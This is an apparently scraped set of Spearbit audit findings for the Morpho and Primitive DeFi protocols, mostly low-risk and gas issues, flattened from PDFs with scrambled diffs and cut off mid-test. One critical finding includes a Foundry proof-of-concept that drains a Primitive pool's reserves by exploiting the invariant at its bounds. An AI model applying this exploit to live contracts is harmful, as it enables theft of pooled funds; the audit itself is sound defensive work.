        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "The initial cumulative price values are integer divisions of unscaled reserves and not UQ112x112 fixed-point values. (reserve0, reserve1, blockTimestampLast) = pair.getReserves(); price0CumulativeLast = reserve1 / reserve0; price1CumulativeLast = reserve0 / reserve1; One of these values will (almost) always be zero due to integer division. Then, when the difference is taken to the real currentCumulativePrices in update, the TWAP will be a large, wrong value. The slippage checks will not work correctly.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "User withdrawals can fail if Morpho position is close to liquidation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "When trying to withdraw funds from Morpho as a P2P supplier the last step of the withdrawal algorithm borrows an amount from the pool (\"hard withdraw\"). If Morphos position on Aaves debt / collateral value is higher than the markets maximum LTV ratio but lower than the markets liquidation threshold, the borrow will fail and the position cannot be liquidated. Therefore withdrawals could fail.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Event Withdrawn is emitted using the wrong amounts of supplyBalanceInOf",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "Inside the _withdraw function, all changes performed to supplyBalanceInOf are done using the _supplier address. The _receiver is correctly used only to transfer the underlying token via underlyingToken.safeTransfer(_- receiver, _amount); The Withdrawn event should be emitted passing the supplyBalanceInOf[_poolTokenAddress] of the supplier and not the receiver. This problem will arise when this internal function is called by PositionsManagerForAave.liquidate where sup- plier (borrower in this case) and receiver (liquidator) would not be the same address.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "_repayERC20ToPool is approving the wrong amount",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "_repayERC20ToPool is approving the amount of underlying token specified via the input parameter _amount when the correct amount that should be approved is the one calculated via: _amount = Math.min( _amount, variableDebtToken.scaledBalanceOf(address(this)).mulWadByRay(_normalizedVariableDebt) );",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Possible unbounded loop over enteredMarkets array in _getUserHypotheticalBalanceStates",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "PositionsManagerForAaveLogic._getUserHypotheticalBalanceStates is looping enteredMar- kets which could be an unbounded array leading to a reverted transaction caused by a block gas limit. While it is true that Morpho will probably handle a subset of assets controlled by Aave, this loop could still revert because of gas limits for a variety of reasons:  In the future Aave could have more assets and Morpho could match 1:1 those assets.  Block gas size could decrease.  Opcodes could cost more gas.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing parameter validation on setters and event spamming prevention",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "User parameter validity should always be verified to prevent contract updates in an inconsistent state. The parameters value should also be different from the old one in order to prevent event spamming (emitting an event when not needed) and improve contract monitoring. contracts/aave/RewardsManagerForAave.sol 20 function setAaveIncentivesController(address _aaveIncentivesController) external override onlyOwner { + + } require(_aaveIncentivesController != address(0), \"param != address(0)\"); require(_aaveIncentivesController != aaveIncentivesController, \"param != prevValue\"); aaveIncentivesController = IAaveIncentivesController(_aaveIncentivesController); emit AaveIncentivesControllerSet(_aaveIncentivesController); contracts/aave/MarketsManagerForAave.sol function setReserveFactor(address _marketAddress, uint16 _newReserveFactor) external onlyOwner { reserveFactor[_marketAddress] = HALF_MAX_BASIS_POINTS <= _newReserveFactor ? HALF_MAX_BASIS_POINTS : _newReserveFactor; updateRates(_marketAddress); emit ReserveFactorSet(_marketAddress, reserveFactor[_marketAddress]); require(_marketAddress != address(0), \"param != address(0)\"); uint16 finalReserveFactor = HALF_MAX_BASIS_POINTS <= _newReserveFactor ? HALF_MAX_BASIS_POINTS : _newReserveFactor; if( finalReserveFactor !== reserveFactor[_marketAddress] ) { reserveFactor[_marketAddress] = finalReserveFactor; emit ReserveFactorSet(_marketAddress, finalReserveFactor); } updateRates(_marketAddress); - - - - - - - + + + + + + + + + + + } function setNoP2P(address _marketAddress, bool _noP2P) external onlyOwner isMarketCreated(_marketAddress) { + } require(_noP2P != noP2P[_marketAddress], \"param != prevValue\"); noP2P[_marketAddress] = _noP2P; emit NoP2PSet(_marketAddress, _noP2P); function updateP2PExchangeRates(address _marketAddress) external override onlyPositionsManager isMarketCreated(_marketAddress) _updateP2PExchangeRates(_marketAddress); + { } 21 function updateSPYs(address _marketAddress) external override onlyPositionsManager isMarketCreated(_marketAddress) _updateSPYs(_marketAddress); + { } contracts/aave/positions-manager-parts/PositionsManagerForAaveGettersSetters.sol function setAaveIncentivesController(address _aaveIncentivesController) external onlyOwner { require(_aaveIncentivesController != address(0), \"param != address(0)\"); require(_aaveIncentivesController != aaveIncentivesController, \"param != prevValue\"); aaveIncentivesController = IAaveIncentivesController(_aaveIncentivesController); emit AaveIncentivesControllerSet(_aaveIncentivesController); + + } Important note: _newNDS min/max value should be accurately validated by the team because this will influence the maximum number of cycles that DDL.insertSorted can do. Setting a value too high would make the transaction fail while setting it too low would make the insertSorted loop exit earlier, resulting in the user being added to the tail of the list. A more detailed issue about the NDS value can be found here: #33 function setNDS(uint8 _newNDS) external onlyOwner { // add a check on `_newNDS` validating correctly max/min value of `_newNDS` require(NDS != _newNDS, \"param != prevValue\"); NDS = _newNDS; emit NDSSet(_newNDS); + + } Important note: _newNDS set to 0 would skip all theMatchingEngineForAave match/unmatch supplier/borrower functions if the user does not specify a custom maxGas A more detailed issue about NDS value can be found here: #34 function setMaxGas(MaxGas memory _maxGas) external onlyOwner { // add a check on `_maxGas` validating correctly max/min value of `_maxGas` // add a check on `_maxGas` internal value checking that at least one of them is different compared to the old version maxGas = _maxGas; emit MaxGasSet(_maxGas); + + ,! } function setTreasuryVault(address _newTreasuryVaultAddress) external onlyOwner { require(_newTreasuryVaultAddress != address(0), \"param != address(0)\"); require(_newTreasuryVaultAddress != treasuryVault, \"param != prevValue\"); treasuryVault = _newTreasuryVaultAddress; emit TreasuryVaultSet(_newTreasuryVaultAddress); + + } function setRewardsManager(address _rewardsManagerAddress) external onlyOwner { require(_rewardsManagerAddress != address(0), \"param != address(0)\"); require(_rewardsManagerAddress != rewardsManager, \"param != prevValue\"); rewardsManager = IRewardsManagerForAave(_rewardsManagerAddress); emit RewardsManagerSet(_rewardsManagerAddress); + + } Important note: Should also check that _poolTokenAddress is currently handled by the PositionsManagerForAave and by the MarketsManagerForAave. Without this check a poolToken could start in a paused state. 22 + function setPauseStatus(address _poolTokenAddress) external onlyOwner { require(_poolTokenAddress != address(0), \"param != address(0)\"); bool newPauseStatus = !paused[_poolTokenAddress]; paused[_poolTokenAddress] = newPauseStatus; emit PauseStatusSet(_poolTokenAddress, newPauseStatus); }",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "DDL should prevent inserting items with 0 value",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "Currently the DDL library is only checking that the actual value (_list.accounts[_id].value) in the list associated with the _id is 0 to prevent inserting duplicates. The DDL library should also verify that the inserted value is greater than 0. This check would prevent adding users with empty values, which may potentially cause the list and as a result the overall protocol to underperform.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "insertSorted iterates more than max iterations parameter",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "The insertSorted function iterates _maxIterations + 1 times instead of _maxIterations times.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "insertSorted does not behave like a FIFO for same values",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "Users that have the same value are inserted into the list before other users with the same value. It does not respect the \"seniority\" of the users order and should behave more like a FIFO queue.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "insertSorted inserts elements at wrong index",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "The insertSorted function inserts elements after the last element has been insterted, when these should have actually been insterted before the last element. The sort order is therefore wrong, even if the maximum iterations count has not been reached. This is because of the check that the current element is not the tail. if ( ... && current != _list.tail) { insertBefore } else { insertAtEnd } Example:  list = [20]. insert(40) then current == list.tail, and is inserted at the back instead of the front. result = [20, 40]  list = [30, 10], insert(20) insertion point should be before current == 10, but also current == tail therfore the current != _list.tail condition is false and the element is wrongly inserted at the end. result = [30, 10, 20]",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "PositionsManagerForAaveLogic gas optimization suggestions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "Update the remainingTo variable only when needed. Inside each function, the remainingTo counter could be moved inside the if statement to avoid calculation when the amount that should be subtracted is >0.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "MarketsManagerForAave._updateSPYs could store calculations in local variables to save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "The calculation in the actual code must be updated following this issue: #36. This current issue is an example on how to avoid an additional SLOAD. The function could store locally currentReserveFactor, newSupplyP2PSPY and newBorrowP2PSPY to avoid addi- tional SLOAD",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Declare variable as immutable/constant and remove unused variables",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "Some state variable can be declared as immutable or constant to save gas. Constant variables should be names in uppercase + snake case following the official Solidity style guide. Additionally, variables which are never used across the protocol code can be removed to save gas during deployment and improve readability. RewardsManagerForAave.sol -ILendingPoolAddressesProvider public addressesProvider; -ILendingPool public lendingPool; +ILendingPool public immutable lendingPool; -IPositionsManagerForAave public positionsManager; +IPositionsManagerForAave public immutable positionsManager; SwapManagerUniV2.sol -IUniswapV2Router02 public swapRouter = IUniswapV2Router02(0x60aE616a2155Ee3d9A68541Ba4544862310933d4); // JoeRouter ,! +IUniswapV2Router02 public constant SWAP_ROUTER = ,! IUniswapV2Router02(0x60aE616a2155Ee3d9A68541Ba4544862310933d4); // JoeRouter -IUniswapV2Pair public pair; +IUniswapV2Pair public immutable pair; SwapManagerUniV3.sol 27 -ISwapRouter public swapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564); // The Uniswap V3 router. ,! +ISwapRouter public constant SWAP_ROUTER = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564); // ,! The Uniswap V3 router. -address public WETH9; // Intermediate token address. +address public immutable WETH9; // Intermediate token address. -IUniswapV3Pool public pool0; +IUniswapV3Pool public immutable pool0; -IUniswapV3Pool public pool1; +IUniswapV3Pool public immutable pool1; -bool public singlePath; +bool public boolean singlePath; SwapManagerUniV3OnEth.sol -ISwapRouter public swapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564); // The Uniswap V3 router. ,! +ISwapRouter public constant SWAP_ROUTER = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564); // ,! The Uniswap V3 router. -IUniswapV3Pool public pool0; +IUniswapV3Pool public immutable pool0; -IUniswapV3Pool public pool1; +IUniswapV3Pool public immutable pool1; -IUniswapV3Pool public pool2; +IUniswapV3Pool public immutable pool2;",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Function does not revert if balance to transfer is zero",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "Currently when the claimToTreasury() function is called it gets the amountToClaim by using un- derlyingToken.balanceOf(address(this). It then uses this amountToClaim in the safeTransfer() function and the ReserveFeeClaimed event is emitted. The problem is that the function does not take into account that it is possible for the amountToClaim to be 0. In this case the safeTransfer function would still be called and the ReserveFeeClaimed event would still be emitted unnecessarily.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "matchingEngine should be initialized in PositionsManagerForAaveLogics initialize function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "MatchingEngineForAave inherits from PositionsManagerForAaveStorage which is an UUPSUp- gradeable contract. Following UUPS best practices, should also be initialized. the MatchingEngineForAave deployed by PositionsManagerForAaveLogic",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Informational"
        ]
    },
    {
        "title": "Misc: notation, style guide, global unit types, etc",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "Follow solidity notation, standard style guide and global unit types to improve readability.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Informational"
        ]
    },
    {
        "title": "Outdated or wrong Natspec documentation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "Some Natspec documentation is missing parameters/return value or is not correctly updated to reflect the function code.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use the official UniswapV3 0.8 branch",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "The current repository creates local copies of the UniswapV3 codebase and manually migrates the contracts to Solidity 0.8.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unused events and unindexed event parameters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "Certain parameters should be defined as indexed to track them from web3 applications / security monitoring tools.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Informational"
        ]
    },
    {
        "title": "Rewards are ignored in the on-pool rate computation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
        "body": "Morpho claims that the protocol is a strict improvement upon the underlying lending protocols. It tries to match as many suppliers and borrowers P2P at the supply/borrow mid-rate of the underlying protocol. However, given high reward incentives paid out to on-pool users it could be the case that being on the pool yields a better rate than the P2P rate.",
        "labels": [
            "Spearbit",
            "Morpho",
            "Severity: Informational"
        ]
    },
    {
        "title": "tradingFunction returns wrong invariant at bounds, allowing to steal all pool reserves",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review-July.pdf",
        "body": "The tradingFunction computing the invariant value of k = (y/K) - (1-x) +  returns the wrong value at the bounds of x and y. The bounds of x are 0 and 1e18, the bounds of y are 0 and K, the strike price. If x or y is at these bounds, the corresponding term's computation is skipped and therefore implicitly set to 0, its initialization value. int256 invariantTermX; // (1-x) // @audit if x is at the bounds, the term remains 0 if (self.reserveXPerWad.isBetween(lowerBoundX + 1, upperBoundX - 1)) { invariantTermX = Gaussian.ppf(int256(WAD - self.reserveXPerWad)); } int256 invariantTermY; // (y/K) // @audit if y is at the bounds, the term remains 0 if (self.reserveYPerWad.isBetween(lowerBoundY + 1, upperBoundY - 1)) { invariantTermY = Gaussian.ppf( int256(self.reserveYPerWad.divWadUp(self.strikePriceWad)) ); } Note that  = Gaussian.ppf is the probit function which is undefined at 0 and 1.0, but tends towards -infinity at 0 and +infinity at 1.0 = 1e18. (The closest values used in the Solidity approximation are Gaussian.ppf(1) = -8710427241990476442 ~ -8.71 and Gaussian.ppf(1e18-1) = 8710427241990476442 ~ 8.71.) This fact can be abused by an attacker to steal the pool reserves. For example, the y-term (y/K) will be a negative value for y/K < 0.5. Trading out all y reserve, will compute the new invariant with y set to 0 and the y-term (y/K) = (0) = -infinity is set to 0 instead, increasing the overall invariant, accepting the swap. // SPDX-License-Identifier: GPL-3.0-only pragma solidity ^0.8.4; import \"solmate/utils/SafeCastLib.sol\"; import \"./Setup.sol\"; contract TestSpearbit is Setup { using SafeCastLib for uint256; using AssemblyLib for uint256; using AssemblyLib for uint128; using FixedPointMathLib for uint256; using FixedPointMathLib for uint128; function test_swap_all_out() public defaultConfig useActor usePairTokens(10 ether) allocateSome(1 ether) { (uint256 reserveAsset, uint256 reserveQuote) = subject().getPoolReserves(ghost().poolId); bool sellAsset = true; uint128 amtIn = 2; // pass reserve-not-stale check after taking fee uint128 amtOut = uint128(reserveQuote); 4 uint256 prev = ghost().quote().to_token().balanceOf(actor()); Order memory order = Order({ useMax: false, poolId: ghost().poolId, input: amtIn, output: amtOut, sellAsset: sellAsset }); subject().swap(order); uint256 post = ghost().quote().to_token().balanceOf(actor()); assertTrue(post > prev, \"swap-failed\"); } }",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "getSpotPrice, approximateReservesGivenPrice, getStrategyData ignore time to maturity",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review-July.pdf",
        "body": "When calling getSpotPrice, getStrategyData or approximateReservesGivenPrice, the pool con- fig is transformed into a NormalCurve struct. This transformation always sets the time to maturity field to the entire duration 5 function transform(PortfolioConfig memory config) pure returns (NormalCurve memory) { return NormalCurve({ reserveXPerWad: 0, reserveYPerWad: 0, strikePriceWad: config.strikePriceWad, standardDeviationWad: config.volatilityBasisPoints.bpsToPercentWad(), timeRemainingSeconds: config.durationSeconds, invariant: 0 }); } Neither is the curve.timeRemainingSeconds value overridden with the correct value for the mentioned functions. The reported spot price will be wrong after the pool has been initialized and integrators cannot rely on this value.",
        "labels": [
            "Spearbit",
            "Primitive",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Numerical error on larger trades favors the swapper relative to mathematically ideal pricing",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Primitive-Spearbit-Security-Review-July.pdf",
        "body": "To test the accuracy of the Solidity numerical methods used, a Python implementation of the swap logic was created using a library that supports arbitrary precision (https://mpmath.org/). Solidity swap execu- tions generated in a custom fuzz test were compared against arbitrary precision results using Foundry's ffi feature (https://book.getfoundry.sh/forge/differential-ffi-testing). Cases where the \"realized\" swap price was better for the swapper than the \"ideal\" swap price were flagged. Deviations in the swapper's favor as large as 25% were observed (and larger ones likely exist). These seem to be a function of the size of the swap made--larger swaps favor the swapper more than smaller swaps (in fact, deviations were observed to trend towards zero as swap size relative to pool size decreased). It is unclear if there's any problem in practice from this behavior--large swaps will still incur large slippage and are only incentivized when the price has \"jumped\" drastically; fees also help make up for losses. Without going further, it can be stated that there is a risk for pools with frequent discontinuous price changes to track the theoretical payoff more poorly, but further numerical investigations are needed to determine whether there's a serious concern. The test cases below require the simulation repo to be cloned into a Python virtual environment in a directory named primitive-math-venv with the needed dependencies at the same directory hierarchy level as the port- folio repository. That is, the portfolio/ directory and primitive-math-venv/ directories should be in the same folder, and the primitive-math-venv/ folder should contain the primitive-sim repository. The virtual environ- ment needs to be activated and have the mpmath, scipy, numpy, and eth_abi dependencies installed via pip or another method. Alternatively, these can be installed globally in which case the primitive-math-venv directory does not need to be a virtual environment. // SPDX-License-Identifier: GPL-3.0-only pragma solidity ^0.8.4; import \"solmate/utils/SafeCastLib.sol\"; import \"./Setup.sol\"; 6 contract TestNumericalDeviation is Setup { using SafeCastLib for uint256; using AssemblyLib for uint256; using AssemblyLib for uint128; using FixedPointMathLib for uint256; using FixedPointMathLib for uint128; bool printLogs = true; function _fuzz_random_args( bool sellAsset, uint256 amountIn, uint256 amountOut ) internal returns (bool swapExecuted) { Order memory maxOrder = subject().getMaxOrder(ghost().poolId, sellAsset, actor()); amountIn = bound(amountIn, maxOrder.input / 1000 + 1, maxOrder.input); amountOut = subject().getAmountOut(ghost().poolId, sellAsset, amountIn, actor()); if (printLogs) console.log(\"amountOut: \", amountOut); Order memory order = Order({ useMax: false, poolId: ghost().poolId, input: amountIn.safeCastTo128(), output: amountOut.safeCastTo128(), sellAsset: sellAsset }); try subject().simulateSwap({ order: order, timestamp: block.timestamp, swapper: actor() }) returns (bool swapSuccess, int256 prev, int256 post) { try subject().swap(order) { assertTrue( swapSuccess, \"simulateSwap-failed but swap succeeded\" ); assertTrue(post >= prev, \"post-invariant-not-gte-prev\"); swapExecuted = true; } catch { assertTrue( !swapSuccess, \"simulateSwap-succeeded but swap failed\" ); } } catch { // pass this case } } struct TestVals { uint256 strike; uint256 volatility_bps; uint256 durationSeconds; uint256 ttm; } // fuzzing entrypoint used to find violating swaps function test_swap_deviation(uint256 amtIn, uint256 amtOut) 7 public defaultConfig useActor usePairTokens(10 ether) allocateSome(1 ether) { PortfolioPool memory pool = ghost().pool(); (uint256 preXPerL, uint256 preYPerL) = (pool.virtualX, pool.virtualY); if (printLogs) { console.log(\"x_start: \", preXPerL); console.log(\"y_start: \", preYPerL); } TestVals memory tv; { uint256 creationTimestamp; (tv.strike, tv.volatility_bps, tv.durationSeconds, creationTimestamp,) = NormalStrategy(pool.strategy).configs(ghost().poolId); tv.ttm = creationTimestamp + tv.durationSeconds - block.timestamp; if (printLogs) { console.log(\"strike: \", tv.strike); console.log(\"volatility_bps: \", tv.volatility_bps); console.log(\"durationSeconds: \", tv.durationSeconds); console.log(\"creationTimestamp: \", creationTimestamp); console.log(\"block.timestamp: \", block.timestamp); console.log(\"ttm: \", tv.ttm); console.log(\"protocol fee: \", subject().protocolFee()); console.log(\"pool fee: \", pool.feeBasisPoints); console.log(\"pool priority fee: \", pool.priorityFeeBasisPoints); } } bool sellAsset = true; if (printLogs) console.log(\"sellAsset: \", sellAsset); { bool swapExecuted = _fuzz_random_args(sellAsset, amtIn, amtOut); if (!swapExecuted) return; // not interesting to check swap if it didn't execute } pool = ghost().pool(); (uint256 postXPerL, uint256 postYPerL) = (pool.virtualX, pool.virtualY); if (printLogs) { console.log(\"x_end: \", postXPerL); console.log(\"y_end: \", postYPerL); } = \"python3\"; = \"../primitive-math-venv/primitive-sim/check_swap_result.py\"; = \"--x\"; = vm.toString(preXPerL); = \"--y\"; = vm.toString(preYPerL); = \"--strike\"; = vm.toString(tv.strike); = \"--vol_bps\"; = vm.toString(tv.volatility_bps); string[] memory cmds = new string[](18); cmds[0] cmds[1] cmds[2] cmds[3] cmds[4] cmds[5] cmds[6] cmds[7] cmds[8] cmds[9] cmds[10] = \"--duration\"; cmds[11] = vm.toString(tv.durationSeconds); cmds[12] = \"--ttm\"; cmds[13] = vm.toString(tv.ttm); 8 cmds[14] = \"--xprime\"; cmds[15] = vm.toString(postXPerL); cmds[16] = \"--yprime\"; cmds[17] = vm.toString(postYPerL); bytes memory result = vm.ffi(cmds); (uint256 idealFinalDependentPerL) = abi.decode(result, (uint256)); if (printLogs) console.log(\"idealFinalDependentPerL: \", idealFinalDependentPerL); uint256 postDependentPerL = sellAsset ? postYPerL : postXPerL; // Only worried if swap was _better_ than ideal if (idealFinalDependentPerL > postDependentPerL) { uint256 diff = idealFinalDependentPerL - postDependentPerL; uint256 percentErrWad = diff * 1e18 / idealFinalDependentPerL; if (printLogs) console.log(\"%% err wad: \", percentErrWad); // assert at worst 25% error assertLt(percentErrWad, 0.25 * 1e18); } } function test_swap_gt_2pct_dev_in_swapper_favor() public defaultConfig useActor usePairTokens(10 ether) allocateSome(1 ether) { uint256 amtIn = 6552423086988641261559668799172253742131420409793952225706522955; uint256 amtOut = 0; PortfolioPool memory pool = ghost().pool(); (uint256 preXPerL, uint256 preYPerL) = (pool.virtualX, pool.virtualY); if (printLogs) { console.log(\"x_start: \", preXPerL); console.log(\"y_start: \", preYPerL); } TestVals memory tv; { uint256 creationTimestamp; (tv.strike, tv.volatility_bps, tv.durationSeconds, creationTimestamp,) = NormalStrategy(pool.strategy).configs(ghost().poolId); tv.ttm = creationTimestamp + tv.durationSeconds - block.timestamp; if (printLogs) { console.log(\"strike: \", tv.strike); console.log(\"volatility_bps: \", tv.volatility_bps); console.log(\"durationSeconds: \", tv.durationSeconds); console.log(\"creationTimestamp: \", creationTimestamp); console.log(\"block.timestamp: \", block.timestamp); console.log(\"ttm: \", tv.ttm); console.log(\"protocol fee: \", subject().protocolFee()); console.log(\"pool fee: \", pool.feeBasisPoints); console.log(\"pool priority fee: \", pool.priorityFeeBasisPoints); } } bool sellAsset = true; if (printLogs) console.log(\"sellAsset: \", sellAsset); { bool swapExecuted = _fuzz_random_args(sellAsset, amtIn, amtOut); 9 if (!swapExecuted) return; // not interesting to check swap if it didn't execute } pool = ghost().pool(); (uint256 postXPerL, uint256 postYPerL) = (pool.virtualX, pool.virtualY); if (printLogs) { console.log(\"x_end: \", postXPerL); console.log(\"y_end: \", postYPerL); } = \"python3\"; = \"../primitive-math-venv/primitive-sim/check_swap_result.py\"; = \"--x\"; = vm.toString(preXPerL); = \"--y\"; = vm.toString(preYPerL); = \"--strike\"; = vm.toString(tv.strike); = \"--vol_bps\"; = vm.toString(tv.volatility_bps); string[] memory cmds = new string[](18); cmds[0] cmds[1] cmds[2] cmds[3] cmds[4] cmds[5] cmds[6] cmds[7] cmds[8] cmds[9] cmds[10] = \"--duration\"; cmds[11] = vm.toString(tv.durationSeconds); cmds[12] = \"--ttm\"; cmds[13] = vm.toString(tv.ttm); cmds[14] = \"--xprime\"; cmds[15] = vm.toString(postXPerL); cmds[16] = \"--yprime\"; cmds[17] = vm.toString(postYPerL); bytes memory result = vm.ffi(cmds); (uint256 idealFinalYPerL) = abi.decode(result, (uint256)); if (printLogs) console.log(\"idealFinalYPerL: \", idealFinalYPerL); // Only worried if swap was _better_ than ideal if (idealFinalYPerL > postYPerL) { uint256 diff = idealFinalYPerL - postYPerL; uint256 percentErrWad = diff * 1e18 / idealFinalYPerL; if (printLogs) console.log(\"%% err wad: \", percentErrWad); // assert at worst 2% error assertLt(percentErrWad, 0.02 * 1e18); } } function test_swap_gt_5pct_dev_in_swapper_favor() public defaultConfig useActor usePairTokens(10 ether) allocateSome(1 ether) { uint256 amtIn = 524204019310836059902749478707356665714276202503631350973429403; uint256 amtOut = 0; PortfolioPool memory pool = ghost().pool(); (uint256 preXPerL, uint256 preYPerL) = (pool.virtualX, pool.virtualY); if (printLogs) { console.log(\"x_start: \", preXPerL); console.log(\"y_start: \", preYPerL); } TestVals memory tv; 10 { uint256 creationTimestamp; (tv.strike, tv.volatility_bps, tv.durationSeconds, creationTimestamp,) = NormalStrategy(pool.strategy).configs(ghost().poolId); tv.ttm = creationTimestamp + tv.durationSeconds - block.timestamp; if (printLogs) { console.log(\"strike: \", tv.strike); console.log(\"volatility_bps: \", tv.volatility_bps); console.log(\"durationSeconds: \", tv.durationSeconds); console.log(\"creationTimestamp: \", creationTimestamp); console.log(\"block.timestamp: \", block.timestamp); console.log(\"ttm: \", tv.ttm); console.log(\"protocol fee: \", subject().protocolFee()); console.log(\"pool fee: \", pool.feeBasisPoints); console.log(\"pool priority fee: \", pool.priorityFeeBasisPoints); } } bool sellAsset = true; if (printLogs) console.log(\"sellAsset: \", sellAsset); { bool swapExecuted = _fuzz_random_args(sellAsset, amtIn, amtOut); if (!swapExecuted) return; // not interesting to check swap if it didn't execute } pool = ghost().pool(); (uint256 postXPerL, uint256 postYPerL) = (pool.virtualX, pool.virtualY); if (printLogs) { console.log(\"x_end: \", postXPerL); console.log(\"y_end: \", postYPerL); } = \"python3\"; = \"../primitive-math-venv/primitive-sim/check_swap_result.py\"; = \"--x\"; = vm.toString(preXPerL); = \"--y\"; = vm.toString(preYPerL); = \"--strike\"; = vm.toString(tv.strike); = \"--vol_bps\"; = vm.toString(tv.volatility_bps); string[] memory cmds = new string[](18); cmds[0] cmds[1] cmds[2] cmds[3] cmds[4] cmds[5] cmds[6] cmds[7] cmds[8] cmds[9] cmds[10] = \"--duration\"; cmds[11] = vm.toString(tv.durationSeconds); cmds[12] = \"--ttm\"; cmds[13] = vm.toString(tv.ttm); cmds[14] = \"--xprime\"; cmds[15] = vm.toString(postXPerL); cmds[16] = \"--yprime\"; cmds[17] = vm.toString(postYPerL); bytes memory result = vm.ffi(cmds); (uint256 idealFinalYPerL) = abi.decode(result, (uint256)); if (printLogs) console.log(\"idealFinalYPerL: \", idealFinalYPerL); // Only worried if swap was _better_ than ideal if (idealFinalYPerL > postYPerL) { uint256 diff = idealFinalYPerL - postYPerL; uint256 percentErrWad = diff * 1e18 / idealFinalYPerL; if (printLogs) console.log(\"%% err wad: \", percentErrWad); 11 // assert at worst 2% error assertLt(percentErrWad, 0.05 * 1e18); } } function test_swap_gt_25pct_dev_in_swapper_favor() public defaultConfig useActor usePairTokens(10 ether) allocateSome(1 ether) { uint256 amtIn = 110109023928019935126448015360767432374367360662791991077231763772041488708545; uint256 amtOut = 0; PortfolioPool memory pool = ghost().pool(); (uint256 preXPerL, uint256 preYPerL) = (pool.virtualX, pool.virtualY); if (printLogs) { console.log(\"x_start: \", preXPerL); console.log(\"y_start: \", preYPerL); } TestVals memory tv; { uint256 creationTimestamp; (tv.strike, tv.volatility_bps, tv.durationSeconds, creationTimestamp,) = NormalStrategy(pool.strategy).configs(ghost().poolId); tv.ttm = creationTimestamp + tv.durationSeconds - block.timestamp; if (printLogs) { console.log(\"strike: \", tv.strike); console.log(\"volatility_bps: \", tv.volatility_bps); console.log(\"durationSeconds: \", 